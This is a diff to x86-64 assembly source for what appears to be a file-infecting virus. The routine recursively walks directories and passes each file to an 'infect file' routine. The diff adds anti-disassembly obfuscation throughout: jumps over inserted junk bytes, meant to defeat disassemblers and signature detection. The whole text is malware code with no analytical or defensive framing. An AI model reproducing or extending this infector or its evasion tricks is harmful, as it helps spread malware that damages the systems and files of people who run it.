@@ -19,6 +19,8 @@ recursive:
 	jz recursive_exit
 	lea rdi, [r12 + fileName]
 	mov rsi, 0			    ; O_RDONLY
+    jmp $+4
+    db `\x31\x2d`
 	mov rax, SYS_OPEN   	
 	syscall					; open(fileName, O_RDONLY);
 	cmp rax, 0				; if (fd < 0) return ;
@@ -47,7 +49,8 @@ recursive:
 	
 
 	;copy file name to path
-
+	jmp $+4
+    db `\x20\x3c`
 	lea rdi, [rsp + r13 + d_name]
 	call ft_strlen
 	add rax, r8
@@ -64,6 +67,8 @@ recursive:
 
 
 	;check type
+	jmp $+4
+	db `\x69\x6c`
 	xor rax, rax
 	xor rdi, rdi
 	mov di, [rsp + r13 + d_reclen]
@@ -76,7 +81,8 @@ recursive:
 	jmp end_recur					; loop to the next file
 
 	recursive_infect_file:
-
+	jmp $+3
+	db `\x68`
 	push r14					; saves the important register used in infectfile
 	push r13
 	push r12
@@ -90,9 +96,13 @@ recursive:
 
 	jmp end_recur				; loop to the next file
 	true_start_recur:			; loop to the next file if the directories are . and ..
+	jmp $+4
+	db `\x48\x8d`
 	xor rax, rax
 	mov al, [rsp + r13 + d_name]
 	cmp al, '.'
+	jmp $+4
+	db `\x48\x8d`
 	jnz start_recur
 	mov al, [rsp + r13 + d_name + 1]
 	cmp al, '.'
@@ -121,6 +131,8 @@ recursive:
 ;	mov [rdi], byte 0
 
 	end_recur:
+	jmp $+4
+	db `\x48\x8d`
 	xor rax, rax
 	mov ax, [rsp + r13 + d_reclen]
 	cmp rax, 0
@@ -133,6 +145,8 @@ recursive:
 	quit_files_loop:
 	jmp loop_dir			; while (1);
 	recursive_exit:
+	jmp $+4
+	db `\x48\x8d`
 	mov rdi, r15
 	mov rax, SYS_CLOSE
 	syscall					; close(fd)
